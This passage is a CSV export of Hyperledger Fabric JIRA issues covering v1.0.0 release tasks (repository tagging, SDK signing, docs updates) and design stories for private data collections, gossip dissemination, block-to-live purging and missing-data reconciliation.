  fabric-ca-client/package.json",,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy66n:",,,,,,,,,,,1.0,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Jul/17 2:34 AM;jimthematrix;https://gerrit.hyperledger.org/r/#/c/11553/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
prepare fabric-sdk-java for next release,FAB-5073,18781,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,ChristopherFerris,ChristopherFerris,29/Jun/17 7:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Jul/17 12:06 AM,v1.0.0,,,v1.0.1,,fabric-release,,,,,,0,release,,,,,,"update

{{pom.xml}}

{{src}}{{/test/fixture/sdkintegration/.env}}

see https://gerrit.hyperledger.org/r/#/c/10327/",,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy66v:",,,,,,,,,,,1.0,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Tag repositories with v1.0.0,FAB-5074,18782,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,JonathanLevi,ChristopherFerris,ChristopherFerris,29/Jun/17 7:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Jul/17 6:37 PM,v1.0.0,,,v1.0.0,,fabric-release,,,,,,0,release,,,,,,"Tag each repository local clone with the release_notes/v1.0.0-rc1.txt as the tag comment

{{% git tag -a v1.0.0 -F release_notes/v1.0.0.txt}}

{{% git push origin v1.0.0 HEAD:refs/heads/master}}

Tag each of fabric, fabric-ca, fabric-sdk-node, fabric-sdk-java, and fabric-samples.


-----

Note, that one can also tag the repo at a specific commit-level.
E.g., to add the {color:#f79232}*v1.0.0*{color} tag at commit level {color:#205081}*e4b4704*{color}, I used

{{% git tag -a *{color:#f79232}v1.0.0{color} {color:#205081}e4b4704{color}* -F release_notes/v1.0.0.txt}}",,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy673:",,,,,,,,,,,1.0,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
update fabric samples docs with new short URL for release,FAB-5075,18783,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,29/Jun/17 7:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Jul/17 11:20 PM,v1.0.0-rc1,,,v1.0.0,,,,,,,,0,release,,,,,,"create shortened URL that resolves to v1.0.0 tagged version of bootstrap script

visit [https://goo.gl/] and create shortened link for:

[https://raw.githubusercontent.com/hyperledger/fabric/master/scripts/bootstrap-1.0.0.sh]

Update docs/source/samples.rst with the created short link

[https://goo.gl/iX9dek]",,ChristopherFerris,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,Not a security issue,,,,,,,,,,,,,,,FAB-5746,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy67b:",,,,,,,,,,,1.0,,,,,,,,,,,,ChristopherFerris,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jun/17 8:38 PM;ChristopherFerris;https://gerrit.hyperledger.org/r/11243;;;","11/Jul/17 11:20 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/11243/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
test download of release artifacts and samples across all platforms,FAB-5076,18784,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bmos299,ChristopherFerris,ChristopherFerris,29/Jun/17 7:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,19/Jul/17 11:51 PM,v1.0.0,,,v1.0.0,,fabric-release,,,,,,0,release,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy67j:",,,,,,,,,,,1.0,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
sign fabric-sdk-java jar file and publish to maven central,FAB-5077,18785,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jwagantall,ChristopherFerris,ChristopherFerris,29/Jun/17 7:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Jul/17 12:06 AM,v1.0.0,,,v1.0.0,,fabric-release,fabric-sdk-java,,,,,0,release,,,,,,"Before the fabric-sdk-java release jar / artifact can be published to [http://central.sonatype.org/] (aka Maven Central, Central Repository), a detached signature needs to be created by [~ryjones] or [~jwagantall]",,ChristopherFerris,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy67r:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jul/17 10:19 PM;rickr;If this is something to be done with build ( linux foundation)  can we move it to infrastructure ?  Otherwise, I want to get an ETA when this will be *done*. It's been hanging here with no change - another week with no activity and I'm closing.

 

How does this relate to JIRA-4417 ?

 

[~rameshthoomu] ^^^

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
mark version as released in JIRA,FAB-5078,18786,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,ChristopherFerris,ChristopherFerris,29/Jun/17 7:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,19/Jul/17 11:51 PM,v1.0.0,,,v1.0.0,,,,,,,,0,,,,,,,https://jira.hyperledger.org/projects/FAB?selectedItem=com.atlassian.jira.jira-projects-plugin:release-page&status=unreleased,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,60,60,,0%,60,60,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy67z:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"P1 - Ledger support for private data collections/partitions (simulate, validate, commit), restrict private data from transaction/orderer",FAB-5079,18787,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,manish-sethi,denyeart,denyeart,29/Jun/17 7:58 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,03/Oct/17 6:00 PM,,,,,,fabric-ledger,,,,,,0,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy687:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
P1 - Chaincode API support for private data partitions,FAB-5080,18788,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,Senthil1,denyeart,denyeart,29/Jun/17 8:14 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,21/Oct/17 3:17 AM,,,,,,fabric-peer,,,,,,0,,,,,,,,,denyeart,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABCN-270,FABCN-23,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy68f:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"05/Jul/17 10:35 PM;denyeart;[~return_01], 

Senthil is already working on this one.  If you'd like to help on private data, please read through the high level design

[https://docs.google.com/document/d/1ShrgrYPWLznZSZrl5cnvmFq9LtLJ3tYUxjv9GN6rxuI/edit# |https://docs.google.com/document/d/1ShrgrYPWLznZSZrl5cnvmFq9LtLJ3tYUxjv9GN6rxuI/edit]

and let us know your experience in these areas.;;;","21/Oct/17 3:17 AM;denyeart;https://gerrit.hyperledger.org/r/#/c/12257/;;;","28/Mar/18 6:56 PM;Senthil1;[~return_01] Refer to chaincode examples given in [https://github.com/hyperledger/fabric/tree/release-1.1/examples/chaincode/go] and https://jira.hyperledger.org/browse/FAB-6600;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
P1 - State transfer of blocks to include associated private data,FAB-5081,18789,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,C0rWin,denyeart,denyeart,29/Jun/17 8:16 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,07/Sep/17 6:51 PM,,,,,,fabric-gossip,,,,,,0,active,gossip,,,,,"The goal of this task is to extend state transfer capabilities to enable it to replicated private data of transactions, which is distributed out of the ordering service scope.",,C0rWin,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Jul/17 11:53 PM;C0rWin;request missing blocks v2.pdf;https://jira.hyperledger.org/secure/attachment/11782/request+missing+blocks+v2.pdf","27/Jul/17 11:53 PM;C0rWin;response state transfer block.pdf;https://jira.hyperledger.org/secure/attachment/11781/response+state+transfer+block.pdf",,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy68n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,C0rWin,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Aug/17 7:56 PM;C0rWin;Further progress is awaiting resolution of FAB-5780 [~denyeart] [~manish-sethi];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Side DB - Chaincode policy to map private data collections to authorized organizations,FAB-5082,18790,,Epic,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ellaki,denyeart,denyeart,29/Jun/17 8:44 PM,21/Jul/18 4:09 AM,28/Oct/23 3:00 AM,03/May/18 10:48 PM,,,,,,fabric-peer,,,,,10/Sep/19 12:00 AM,0,Release-planning-1.1-TechPreview,,,,,,"This item include a few work items to allow for collection definition within a chaincode's instantiation/deployment. At the first stage this is to be performed by doing changed to LSCC deploy arguments (P2). At later stage, when Resources configuration tree will be available, collection definition will be done as specified here FAB-6042. There will be a follow-up JIRA item to describe the way collection objects would be used in the implementation of PolicyStore/Parser in this case.

 

1. Define collection interface as abstraction to represent different collection organisation
 * Should include initialisation function that takes as input potentially secretly distributed parameters
 * Should be generic enough to cover any unlinkability property we want to add

 2. Define collection config object - done here [https://gerrit.hyperledger.org/r/#/c/13231/] 

 3. Enhance LSCC deploy to take as argument a set of collection config objects 

 4. Simplest implementation of collection object defined here [https://gerrit.hyperledger.org/r/#/c/12757/] and explained in pages 11/12 of this doc [https://docs.google.com/document/d/1xXl6KVeHusoQd7RsBmv_WTmVR6RrMmFRiyChVSB9DPA/edit?usp=sharing] to include
 * Collection name is the same across all collection state updates
 * Collection access policies and access are publicly visible and validatable

 5. Update ValidateLSCCInvocation for the two cases:
      - deploy validation to check correctness of the collections created
      - upgrade validation to reject changes to cc collections

 6. Implement PoicyStore/PolicyParser with simple lookups to stateDB, to retrieve collections’ policies 

 

 

Flows for chaincode instantiation using the endorsement model:

!image-2017-10-03-13-55-33-325.png!  

 Chaincode upgrade flow:

!image-2017-10-03-13-56-35-939.png!

 

Endorser flow for chaincode that writes to a collection:

!image-2017-10-03-13-56-55-498.png!",,denyeart,guillaume.a,Joseph580307,SjirNijssen,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6212,FAB-6213,FAB-5730,,,FABG-440,,,,FAB-1151,,,,,,,,,,,,"03/Oct/17 8:55 PM;elli-androulaki;image-2017-10-03-13-55-33-325.png;https://jira.hyperledger.org/secure/attachment/12200/image-2017-10-03-13-55-33-325.png","03/Oct/17 8:56 PM;elli-androulaki;image-2017-10-03-13-56-35-939.png;https://jira.hyperledger.org/secure/attachment/12201/image-2017-10-03-13-56-35-939.png","03/Oct/17 8:56 PM;elli-androulaki;image-2017-10-03-13-56-55-498.png;https://jira.hyperledger.org/secure/attachment/12202/image-2017-10-03-13-56-55-498.png",,,,,,,,,,,,,,Unset,,Unset,,,P3 - Security in SideDB ,,,,Unset,,,,"1|hzy68v:",,,,Unset,Unset,,,,,,,,,,,,,,,,,,denyeart,guillaume.a,Joseph580307,SjirNijssen,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
P3 - Specify and enforce minimum number of (internal/external) peers private data must be disseminated to (endorsement-time sync send),FAB-5083,18791,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,denyeart,denyeart,29/Jun/17 8:50 PM,21/Jul/18 3:54 AM,28/Oct/23 3:00 AM,16/Oct/17 6:39 AM,,,,,,fabric-gossip,,,,,,0,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy693:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Oct/17 6:39 AM;denyeart;This was done in https://gerrit.hyperledger.org/r/#/c/13877/.

Changing from internal/external policy to requiredPeerCount/maximumPeerCount in [https://gerrit.hyperledger.org/r/#/c/14517/.]  The dissemination will do best-effort to spray the private data to all the organizations that are members of the collection, to at least the required number of peers and at most the maximum number of peers.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"P2 - Gossip (push) dissemination of private data at endorsement time, to at least N other peers, so that peers will likely have private data by validation/commit timeve the private data ",FAB-5084,18792,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,denyeart,denyeart,29/Jun/17 8:53 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,03/Oct/17 6:01 PM,,,,,,fabric-gossip,,,,,,0,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy69b:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
P3 - Proceed with missing private data - Allow commit of transaction even if private data cannot be retrieved,FAB-5085,18793,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,denyeart,denyeart,29/Jun/17 8:55 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,09/Oct/17 6:59 PM,,,,,,fabric-peer,,,,,,0,,,,,,,,,denyeart,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy69j:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"02/Oct/17 7:42 PM;yacovm;https://gerrit.hyperledger.org/r/#/c/14037/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
P2 - Ledger support for missing private data,FAB-5086,18794,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,denyeart,denyeart,29/Jun/17 9:07 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,24/Sep/17 12:53 AM,,,,,,fabric-ledger,,,,,,0,,,,,,,"Private data may be missing for a variety of reasons:

1) Peer may not have access to private data

2) Peer did not previously have access to private data

3) Peer had access to private data, but couldn't find private data at validation time.  

This feature will check for missing private data at endorsement time and return error accordingly.

Also, since not all peers will have data to support validation of non-key queries, invalidate transactions that performed non-key queries.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy69r:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"[sdk-node] Add the ""queryBlockByTxID"" method to the ""Channel"" class",FAB-5087,18795,,Task,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,shumin1027,shumin1027,shumin1027,29/Jun/17 9:09 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Mar/18 11:07 AM,v1.0.0,,,v1.1.0,,fabric-sdk-node,,,,,,0,,,,,,,"Add the ""queryBlockByTxID"" method to the ""Channel"" class to support query the block info by 

transactionID",,davidkhala,harrisob@us.ibm.com,mastersingh24,shumin1027,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5120,,,,,,,,,,,,,,,,,,,,,,,FABN-646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy69z:",,,,,,,,,,,,,,,,,,,,,,,davidkhala,harrisob@us.ibm.com,mastersingh24,shumin1027,,,,,,,,,,,,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Jul/17 2:54 AM;jimthematrix;https://gerrit.hyperledger.org/r/#/c/11301;;;","14/Jul/17 6:31 PM;mastersingh24;We should not be adding new APIs in a patch release - the target for this should be 1.1;;;","01/Mar/18 11:17 AM;davidkhala;[~shumin1027]

I would like to cooperate with you on that. Keep posted.;;;","03/Mar/18 5:07 AM;harrisob@us.ibm.com;https://gerrit.hyperledger.org/r/#/c/11609/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"P2 - Gossip (pull) request for private data at validation time, to retrieve private data if it is not yet available on peer upon validation",FAB-5088,18796,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,denyeart,denyeart,29/Jun/17 9:11 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,16/Oct/17 6:26 AM,,,,,,fabric-gossip,,,,,,0,,,,,,,,,C0rWin,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5971,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy6af:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,C0rWin,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Sep/17 6:51 AM;C0rWin;The work required for this items captured by FAB-5971;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
P3 - Chaincode retention policy for transient private data (block-to-live policy),FAB-5089,18797,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,denyeart,denyeart,29/Jun/17 9:13 PM,21/Jul/18 3:54 AM,28/Oct/23 3:00 AM,16/Oct/17 6:33 AM,,,,,,fabric-peer,,,,,,0,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy6an:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Oct/17 6:33 AM;denyeart;Implemented as core.yaml config option transientstoreMaxBlockRetention. Done in FAB-5091.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
P3 - Chaincode retention policy for private state data (block-to-live policy),FAB-5090,18798,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,denyeart,denyeart,29/Jun/17 9:14 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,04/May/18 3:01 AM,,,,,,fabric-peer,,,,,,0,,,,,,,Need to specify a block-to-live policy in the collection configuration for private data.,,denyeart,jiangyaoguo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5092,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy6av:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,jiangyaoguo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Nov/17 8:47 PM;denyeart;This is currently implemented as a core.yaml property per collection.  Once FAB-6042 is complete, this will be added to the collection configuration under the chaincode configuration in the channel-scoped peer config.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"P3 - Coordinator purge from private transient db based on block-to-live (BTL) policy, for orphaned transactions ",FAB-5091,18799,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,denyeart,denyeart,29/Jun/17 9:15 PM,21/Jul/18 3:55 AM,28/Oct/23 3:00 AM,16/Oct/17 6:31 AM,,,,,,fabric-ledger,,,,,,0,,,,,,,"Need to purge from transient store any orphaned private write sets for transactions that never got submitted for ordering/commit.

Since these records are stored by tx id rather than by collection, the block-to-live policy should not be at collection level, rather it should be at the peer level (core.yaml).",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy6b3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Ledger purge from private state db and write set storage based on block-to-live (BTL) policy,FAB-5092,18800,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,denyeart,denyeart,29/Jun/17 9:16 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,03/May/18 10:52 AM,,,,v1.2.0,,fabric-ledger,,,,,15/Oct/17 12:00 AM,1,,,,,,,,,C0rWin,denyeart,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-1526,FAB-5090,,,,FAB-5096,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-8718,,,,,,,,,"1|hzwsuv:",,,,Unset,,Sprint 7 - NextGen Endorsement,,,,,,Unset,,,,,,,,,,,C0rWin,denyeart,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Reconcile missing private data on peers that are authorized to have it,FAB-5093,18801,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,nirro,denyeart,denyeart,29/Jun/17 9:19 PM,08/Dec/18 1:06 PM,28/Oct/23 3:00 AM,08/Dec/18 1:06 PM,,,,v1.4.0,,fabric-gossip,fabric-ledger,,,,,1,,,,,,,"Stories:

As an organization that has recently been added to a collection via a chaincode upgrade, I would like to automatically receive the prior private data for the collection, so that I can query and endorse future transactions.

As an organization that has access to a collection but couldn't retrieve private data when it was initially committed time, I would like to automatically receive the prior private data for the collection, so that I can query and endorse future transactions.

 

High - level design doc - https://docs.google.com/document/d/16OzAAc-JoxSUDHVva3AYuj_MzslAtoXOGcbjSIwUqUg/edit",,C0rWin,denyeart,manish-sethi,nirro,troyronda,wutongtree,yacovm,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5096,,,,FAB-10599,FAB-11301,FAB-11302,FAB-11323,FAB-11324,FAB-11772,FAB-11773,FAB-11774,FAB-11780,FAB-12000,FAB-12551,FAB-13147,,,,,,,,,,,,,,,,,,Unset,,,FAB-5108,,,,,,,,,"1|hzwzxr:","Missing private data reconciliation is a new feature for v1.4 that requires bookkeeping at commit time.
Existing v1.2 or v1.3 peers that have missing private data will not be able to reconcile their existing missing private data. A new v1.4 peer will need to be brought up and join the channel so that the bookkeeping can be tracked from the genesis block onwards.",Yes,,Unset,,Next Items- Ledger,,,,,,Unset,,,,,"[Nir and Manish to add integration test plan, and collaborate with Rajesh on system test plan.]
SVT test prime: Rajesh Lalgowdar 


System test ideas:
Add a new peer to a channel with a large amount of private data history, ensure it can reconcile old private data efficiently.
Add an existing peer to a new collection with a large amount of private data history, ensure it can reconcile old private data efficiently.
